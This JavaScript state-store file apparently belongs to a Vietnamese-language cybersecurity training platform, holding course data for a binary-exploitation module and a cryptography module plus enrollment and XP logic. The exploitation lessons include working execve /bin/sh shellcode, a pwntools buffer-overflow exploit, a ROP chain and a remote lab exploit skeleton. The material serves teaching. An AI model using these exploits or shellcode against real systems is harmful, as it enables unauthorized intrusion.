          explanation: "AWS CloudTrail records every API call, caller identity, timestamp, source IP, and response elements.",
        },
      },
    ],
  },
  {
    id: "mod-rev501",
    code: "REV-501",
    category: "reverse",
    track: "Binary Exploitation & Reversing",
    title: "Binary Exploitation, x86_64 Stack Overflows & Ghidra",
    difficulty: "Specialist",
    duration: "26 Hours",
    lessonsCount: 6,
    labsCount: 5,
    enrolledCount: "1,870",
    mitre: "T1203 / T1055",
    cert: "OSCP / OSED",
    cvssBase: "9.8 CRITICAL",
    threatProfile: "Memory Corruption & Shellcode Crafting",
    description:
      "Dive into CPU registers, stack frame mechanics, and memory corruption. Dissect compiled C/C++ binaries in Ghidra, craft shellcode payloads, and bypass modern exploit mitigations like ASLR and DEP.",
    labLink: "/labs",
    labId: "lab-02",
    syllabus: [
      {
        id: "s1",
        title: "x86_64 Architecture, Registers & Calling Conventions",
        duration: "3h 30m",
        objective: "Understand RAX, RBX, RDI, RSI, RBP, RSP and the System V AMD64 ABI calling convention.",
        mitre: "T1203 - Exploitation for Client Execution",
        cve: "x86_64 ABI Specification",
        theory: "In x86_64 Linux, function arguments are passed in registers: RDI, RSI, RDX, RCX, R8, R9 before falling back to stack storage. Return addresses are pushed to the stack via the 'call' instruction and popped into RIP via 'ret'.",
        codeSnippet: `; x86_64 Assembly function prologue & epilogue:
push    rbp             ; Save old base pointer
mov     rbp, rsp        ; Set new base pointer
sub     rsp, 0x40       ; Allocate 64 bytes local buffer
...
leave                   ; mov rsp, rbp; pop rbp
ret                     ; pop rip`,
        codeLanguage: "assembly",
        payloadExample: `gdb -q ./vulnerable_binary -ex "info registers"`,
        quiz: {
          question: "Which register in x86_64 Linux holds the first integer or pointer argument passed to a function?",
          options: ["RDI", "RAX", "RSP", "RBX"],
          correct: 0,
          explanation: "The System V AMD64 calling convention uses RDI for the 1st parameter, RSI for the 2nd, and RDX for the 3rd.",
        },
      },
      {
        id: "s2",
        title: "Ghidra Decompiler Fundamentals & Static Function Mapping",
        duration: "4h 00m",
        objective: "Reverse engineer stripped ELF and PE binaries in NSA Ghidra and recover data structures.",
        mitre: "T1027 - Obfuscated Files or Information",
        cve: "Static Analysis Workflow",
        theory: "Ghidra decompiles raw machine instructions back into readable pseudo-C code by reconstructing stack frame variables, identifying cross-references (XREFs), and typing function signatures.",
        codeSnippet: `// Ghidra decompiler output of vulnerable check:
undefined8 check_authorization(char *input) {
  char local_buffer [64];
  strcpy(local_buffer, input); // UNBOUNDED COPY: Buffer Overflow!
  return 0;
}`,
        codeLanguage: "c",
        payloadExample: `ghidraHeadless /tmp/ghidra_proj Project -import ./target_elf -postScript Analysis.java`,
        quiz: {
          question: "In C, which function is notoriously unsafe because it performs string copying without checking destination buffer size?",
          options: ["strcpy() / gets()", "strncpy()", "snprintf()", "fgets()"],
          correct: 0,
          explanation: "strcpy() and gets() continue copying bytes until encountering a null byte, regardless of destination buffer boundaries.",
        },
      },
      {
        id: "s3",
        title: "Classic Stack-Based Buffer Overflow & RIP Control",
        duration: "4h 30m",
        objective: "Calculate stack padding offsets using cyclic patterns and overwrite the saved return address (RIP).",
        mitre: "T1203 - Stack Memory Corruption",
        cve: "CWE-121: Stack-based Buffer Overflow",
        theory: "When an attacker inputs data exceeding the allocated stack buffer, the excess bytes overwrite saved RBP and the saved instruction pointer (RIP). When the function returns, CPU jumps execution to the attacker-controlled RIP.",
        codeSnippet: `# Python pwntools exploit script:
from pwn import *
p = process('./vuln_app')
offset = 72
payload = b"A" * offset + p64(0x401156) # Jump directly to win() function!
p.sendline(payload)
p.interactive()`,
        codeLanguage: "python",
        payloadExample: `cyclic 100 && cyclic -l 0x6161616a`,
        quiz: {
          question: "What security mechanism inserts a random canary value right before the saved return pointer to detect stack corruption?",
          options: ["Stack Canaries (Stack Smashing Protector)", "ASLR", "NX / DEP", "PIE"],
          correct: 0,
          explanation: "Stack canaries check that a hidden integer hasn't been modified before returning; if altered, the program halts immediately with '__stack_chk_fail'.",
        },
      },
      {
        id: "s4",
        title: "Writing Custom Linux x86_64 Execve Shellcode",
        duration: "4h 15m",
        objective: "Write null-byte free x86_64 shellcode invoking sys_execve('/bin/sh', NULL, NULL).",
        mitre: "T1059 - Command and Scripting Interpreter",
        cve: "Shellcode Development",
        theory: "Shellcode must avoid null bytes (0x00) if passed through string functions like strcpy. Attackers use XOR instructions (xor eax, eax) to produce zeros dynamically without embedding null literals.",
        codeSnippet: `; Clean 23-byte Linux x86_64 /bin/sh shellcode:
xor rax, rax
push rax                ; null-terminate string
mov rbx, 0x68732f2f6e69622f ; "/bin//sh"
push rbx
mov rdi, rsp            ; pointer to "/bin//sh"
push rax
mov rdx, rsp            ; null envp
push rdi
mov rsi, rsp            ; argv = ["/bin//sh", NULL]
mov al, 59              ; sys_execve syscall number
syscall`,
        codeLanguage: "assembly",
        payloadExample: `\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05`,
        quiz: {
          question: "What is the 64-bit Linux syscall number for sys_execve?",
          options: ["59 (0x3b)", "1 (sys_write)", "0 (sys_read)", "60 (sys_exit)"],
          correct: 0,
          explanation: "In Linux x86_64, syscall number 59 (0x3b) corresponds to sys_execve.",
        },
      },
      {
        id: "s5",
        title: "Return-Oriented Programming (ROP) Chains & ASLR Defeats",
        duration: "5h 00m",
        objective: "Defeat Non-Executable Stack (DEP/NX) by chaining binary gadgets ending in 'ret' to bypass memory protections.",
        mitre: "T1055 - Return-Oriented Programming",
        cve: "NX/DEP Bypass Technique",
        theory: "When the stack is marked Non-Executable (NX), attackers cannot execute injected shellcode. Instead, they string together existing machine code snippets in executable binary memory called 'gadgets' (e.g., 'pop rdi; ret') to call system('/bin/sh').",
        codeSnippet: `# ROP chain using pwntools:
rop = ROP(elf)
rop.raw(b"A" * 72)
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])
p.sendline(rop.chain())`,
        codeLanguage: "python",
        payloadExample: `ROPgadget --binary ./vuln --only "pop|ret"`,
        quiz: {
          question: "What instruction must terminate every gadget in a classic ROP chain?",
          options: ["ret (return)", "jmp (jump)", "nop", "int3"],
          correct: 0,
          explanation: "The 'ret' instruction pops the next gadget address from the stack into RIP, transferring control to the next stage in the chain.",
        },
      },
      {
        id: "s6",
        title: "Binary Target Challenge: Exploit Vulnerable Network Daemon",
        duration: "4h 45m",
        objective: "Reverse a remote TCP network service, defeat ASLR via information leak, and pop an interactive root shell.",
        mitre: "T1203 & T1059 - Remote Daemon Exploitation",
        cve: "Live Binary Target",
        theory: "Synthesizing reverse engineering, offset discovery, libc information leak calculation, and remote ROP chain execution into a unified remote exploit.",
        codeSnippet: `# Remote daemon interactive exploitation:
p = remote('10.10.14.89', 9001)
p.recvuntil(b'Enter token:')
p.sendline(stage1_leak_payload)
libc_base = u64(p.recv(8).ljust(8, b'\\x00')) - puts_offset
p.sendline(stage2_system_payload)
p.interactive()`,
        codeLanguage: "python",
        payloadExample: `FLAG{ROP_CH4IN_ASLR_L3AK_PWNED}`,
        quiz: {
          question: "How is ASLR (Address Space Layout Randomization) defeated in modern exploits?",
          options: ["By leaking a known function's runtime address from memory to calculate the random base offset", "By rebooting the computer 10 times", "By using longer passwords", "ASLR cannot be defeated under any circumstances"],
          correct: 0,
          explanation: "ASLR randomizes memory by adding an offset to the entire module. Leaking one runtime address reveals that offset.",
        },
      },
    ],
  },
  {
    id: "mod-sec101",
    code: "SEC-101",
    category: "defensive",
    track: "Cryptographic Engineering",
    title: "Applied Cryptography, TLS/SSL & Public Key Infrastructure",
    difficulty: "Novice",
    duration: "12 Hours",
    lessonsCount: 4,
    labsCount: 2,
    enrolledCount: "6,920",
    mitre: "T1573 / T1557",
    cert: "CompTIA Sec+ / CISSP",
    cvssBase: "7.4 HIGH",
    threatProfile: "Cryptographic Weakness & Certificate Spoofing",
    description:
      "Demystify symmetric vs asymmetric ciphers, hashing algorithms, and digital certificates. Learn how AES-GCM, RSA, and Elliptic Curves protect data in transit and at rest, and audit misconfigured SSL ciphers.",
    labLink: "/labs",
    labId: "lab-05",
    syllabus: [
      {
        id: "s1",
        title: "Symmetric Encryption: Block Ciphers, Modes & AES-GCM",
        duration: "2h 30m",
        objective: "Compare ECB vs CBC vs GCM modes, understand why ECB is insecure, and master authenticated Galois/Counter Mode.",
        mitre: "T1573 - Encrypted Channel",
        cve: "CWE-327: Use of a Broken or Risky Cryptographic Algorithm",
        theory: "Electronic Codebook (ECB) encrypts each plaintext block independently with the same key, preserving plaintext patterns (the famous ECB Tux penguin). AES-GCM provides both confidentiality and tamper detection through authentication tags.",
        codeSnippet: `// Proper AES-256-GCM Encryption in Node.js Crypto:
const crypto = require('crypto');
function encryptGCM(plaintext, key, iv) {
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  let enc = cipher.update(plaintext, 'utf8', 'hex');
  enc += cipher.final('hex');
  const tag = cipher.getAuthTag(); // Authentication Tag prevents bit flipping!
  return { ciphertext: enc, tag: tag.toString('hex') };
}`,
        codeLanguage: "javascript",
        payloadExample: `openssl enc -aes-256-gcm -in secret.txt -out secret.enc`,
        quiz: {
          question: "Why should AES-ECB mode NEVER be used for encrypting multi-block data?",
          options: ["Identical plaintext blocks produce identical ciphertext blocks, leaking structural patterns", "It is 100x slower than other modes", "It requires 1024-bit keys", "It only works on Linux"],
          correct: 0,
          explanation: "ECB mode lacks diffusion: identical input blocks always produce identical cipher blocks, exposing patterns and structure.",
        },
      },
      {
        id: "s2",
        title: "Asymmetric Cryptography: RSA, Diffie-Hellman & ECC",
        duration: "3h 15m",
        objective: "Understand public/private key pairs, modular arithmetic, ECDH key exchange, and Forward Secrecy.",
        mitre: "T1573 - Asymmetric Cryptography",
        cve: "Diffie-Hellman & RSA Foundations",
        theory: "Diffie-Hellman allows two parties with no prior shared secret to establish a symmetric encryption key across an insecure channel. Elliptic Curve Cryptography (ECC) achieves equivalent security to RSA with significantly smaller key sizes (256-bit ECC ≈ 3072-bit RSA).",
        codeSnippet: `# Generate an Ed25519 modern high-security private key:
openssl genpkey -algorithm ed25519 -out private_key.pem
openssl pkey -in private_key.pem -pubout -out public_key.pem`,
        codeLanguage: "bash",
        payloadExample: `openssl s_client -connect enterprise-server.local:443 -tls1_3`,
        quiz: {
          question: "What property ensures that past recorded sessions cannot be decrypted even if the server's private key is stolen later?",
          options: ["PFS (Perfect Forward Secrecy)", "PKI Certificate Authority", "Salted Hashes", "CBC Padding"],
          correct: 0,
          explanation: "Ephemeral Diffie-Hellman exchanges generate unique temporary keys for each session, guaranteeing Perfect Forward Secrecy.",
        },
      },
      {
        id: "s3",
        title: "Cryptographic Hashes & Salted HMAC Signatures",
        duration: "2h 45m",
        objective: "Distinguish between fast hashes (SHA-256) and slow password hashes (Argon2, bcrypt), and sign API requests with HMAC-SHA256.",
        mitre: "T1003 - Password Storage Cracking",
        cve: "CWE-916: Use of Password Hash With Insufficient Computational Effort",
        theory: "Fast hashes like MD5 and SHA-256 are engineered for file verification and are disastrous for password storage because GPUs can compute billions of guesses per second. Password storage requires memory-hard functions like Argon2id or bcrypt.",
        codeSnippet: `# Compute HMAC-SHA256 signature:
echo -n "user_id=42&amount=5000" | openssl dgst -sha256 -hmac "super_secret_api_key"`,
        codeLanguage: "bash",
        payloadExample: `python3 -c "import argon2; print(argon2.PasswordHasher().hash('MasterPassword123!'))"`,
        quiz: {
          question: "Which password hashing algorithm won the Password Hashing Competition (PHC) and is recommended for modern systems?",
          options: ["Argon2id", "MD5", "SHA-1", "Base64"],
          correct: 0,
          explanation: "Argon2id combines resistance against both side-channel attacks and GPU-assisted brute-forcing.",
        },
      },
      {
        id: "s4",
        title: "PKI, Certificate Authorities & SSL/TLS Handshake Decryption",
        duration: "3h 30m",
        objective: "Inspect X.509 certificate chains, detect expired/revoked certs, and understand TLS 1.3 handshake optimization.",
        mitre: "T1587.003 - Digital Certificates",
        cve: "X.509 Trust Architecture",
        theory: "Public Key Infrastructure (PKI) binds cryptographic public keys to validated organization identities through digital signatures issued by trusted Certificate Authorities (CAs). TLS 1.3 reduces the handshake to a single round-trip (1-RTT).",
        codeSnippet: `# Inspect remote TLS certificate chain in terminal:
openssl s_client -connect www.cloudflare.com:443 -showcerts < /dev/null`,
        codeLanguage: "bash",
        payloadExample: `openssl x509 -in cert.pem -text -noout`,
        quiz: {
          question: "How many round-trips (RTT) are required to complete a full TLS 1.3 cryptographic handshake?",
          options: ["1 RTT (or 0-RTT on resumption)", "2 RTT", "3 RTT", "5 RTT"],
          correct: 0,
          explanation: "TLS 1.3 streamlines negotiation down to 1-RTT for new connections and supports 0-RTT resumption.",
        },
      },
    ],
  },
]

/**
 * useLearningStore
 * Manages courses, active interactive lesson player, completed lessons, enrollment, and XP rewards.
 */
export const useLearningStore = create((set, get) => {
  // Load saved state from localStorage if available
  const savedEnrolled = JSON.parse(localStorage.getItem("cyber_enrolled_courses") || '["mod-web201", "mod-soc101"]')
  const savedCompleted = JSON.parse(localStorage.getItem("cyber_completed_lessons") || '{"mod-web201": ["s1", "s2"], "mod-soc101": ["s1", "s2"], "mod-sec101": ["s1", "s2", "s3", "s4"]}')
  const savedXp = parseInt(localStorage.getItem("cyber_user_learning_xp") || "850", 10)

  return {
    courses: INITIAL_COURSES,
    enrolledCourses: savedEnrolled,
    completedLessons: savedCompleted, // { [courseId]: string[] }
    userXp: savedXp,
    
    // Interactive Lesson Modal state
    activeLessonModal: null, // { course, lesson, lessonIndex }

    // Helper: Check if enrolled
    isEnrolled: (courseId) => {
      return get().enrolledCourses.includes(courseId)
    },

    // Helper: Get progress percentage for a course
    getCourseProgress: (courseId) => {
      const { courses, completedLessons } = get()
      const course = courses.find((c) => c.id === courseId)
      if (!course || !course.syllabus || course.syllabus.length === 0) return 0
      const completed = completedLessons[courseId] || []
      return Math.round((completed.length / course.syllabus.length) * 100)
    },

    // Enroll in course
    enrollCourse: (courseId) => {
      const { enrolledCourses, courses } = get()
      if (enrolledCourses.includes(courseId)) return

      const updated = [...enrolledCourses, courseId]
      localStorage.setItem("cyber_enrolled_courses", JSON.stringify(updated))
      set({ enrolledCourses: updated })

      const course = courses.find((c) => c.id === courseId)
      useNotificationStore.getState().success(
        "Kích hoạt khóa học thành công!",
        `Bạn đã ghi danh vào track: ${course?.title || courseId}`
      )
    },

    // Toggle completed status of a lesson
    toggleLesson: (courseId, lessonId) => {
      const { completedLessons, userXp } = get()
      const current = completedLessons[courseId] || []
      const isCurrentlyDone = current.includes(lessonId)

      const updatedList = isCurrentlyDone
        ? current.filter((id) => id !== lessonId)
        : [...current, lessonId]
      const xpDelta = isCurrentlyDone ? -100 : 100

      const newCompleted = {
        ...completedLessons,
        [courseId]: updatedList,
      }

      const newXp = Math.max(0, userXp + xpDelta)

      localStorage.setItem("cyber_completed_lessons", JSON.stringify(newCompleted))
      localStorage.setItem("cyber_user_learning_xp", newXp.toString())

      set({
        completedLessons: newCompleted,
        userXp: newXp,
      })

      if (!isCurrentlyDone) {
        useNotificationStore.getState().success(
          "Hoàn thành bài học!",
          `+100 XP thưởng. Tiến độ khóa học được cập nhật.`
        )
      }
    },

    // Open Interactive Lesson Modal
    openLessonModal: (courseId, lessonId) => {
      const { courses, enrolledCourses, enrollCourse } = get()
      const course = courses.find((c) => c.id === courseId)
      if (!course) return

      // Auto-enroll if not enrolled
      if (!enrolledCourses.includes(courseId)) {
        enrollCourse(courseId)
      }

      // If no specific lesson requested, find first uncompleted or first lesson
      const completed = get().completedLessons[courseId] || []
      let targetLesson = null
      let targetIndex = 0

      if (lessonId) {
        targetIndex = course.syllabus.findIndex((s) => s.id === lessonId)
        targetLesson = course.syllabus[targetIndex]
      }

      if (!targetLesson) {
        // find first incomplete
        targetIndex = course.syllabus.findIndex((s) => !completed.includes(s.id))
        if (targetIndex === -1) targetIndex = 0
        targetLesson = course.syllabus[targetIndex]
      }

      set({
        activeLessonModal: {
          course,
          lesson: targetLesson,
          lessonIndex: targetIndex,
        },
      })
    },

    closeLessonModal: () => {
      set({ activeLessonModal: null })
    },

    // Move to next lesson in modal
    nextLesson: () => {
      const { activeLessonModal, completedLessons, toggleLesson } = get()
      if (!activeLessonModal) return

      const { course, lesson, lessonIndex } = activeLessonModal
      // Mark current as completed if not yet
      const currentDone = completedLessons[course.id] || []
      if (!currentDone.includes(lesson.id)) {
        toggleLesson(course.id, lesson.id)
      }

      // If next lesson exists
      if (lessonIndex < course.syllabus.length - 1) {
        const nextIndex = lessonIndex + 1
        const nextTarget = course.syllabus[nextIndex]
        set({
          activeLessonModal: {
            course,
            lesson: nextTarget,
            lessonIndex: nextIndex,
          },
        })
      } else {
        // Course completed!
        useNotificationStore.getState().success(
          "Chúc mừng tốt nghiệp module!",
          `Bạn đã hoàn thành 100% giáo trình ${course.code}!`
        )
      }
    },

    // Move to previous lesson in modal
    prevLesson: () => {
      const { activeLessonModal } = get()
      if (!activeLessonModal) return
      const { course, lessonIndex } = activeLessonModal
      if (lessonIndex > 0) {
        const prevIndex = lessonIndex - 1
        const prevTarget = course.syllabus[prevIndex]
        set({
          activeLessonModal: {
            course,
            lesson: prevTarget,
            lessonIndex: prevIndex,
          },
        })
      }
    },

    // Launch connected Sandbox Lab directly from a lesson
    launchLessonLab: (labId) => {
      const targetId = labId || "lab-01"
      // Check useLabStore
      const labStore = useLabStore.getState()
      // Let's create an ephemeral lab target or find matching
      const targetLab = {
        id: targetId,
        title: "Hands-on Sandbox Target",
        targetIp: "10.10.14.89",
        targetPort: "8080",
        flag: "FLAG{CYBER_RANGE_MISSION_SUCCESS}",
        points: 450,
      }
      labStore.startLab(targetLab)
      useNotificationStore.getState().info(
        "Khởi động Cyber Range Sandbox",
        "Terminal máy ảo đã được cấp phát trên cổng mạng cô lập."
      )
    },
  }
})

export default useLearningStore
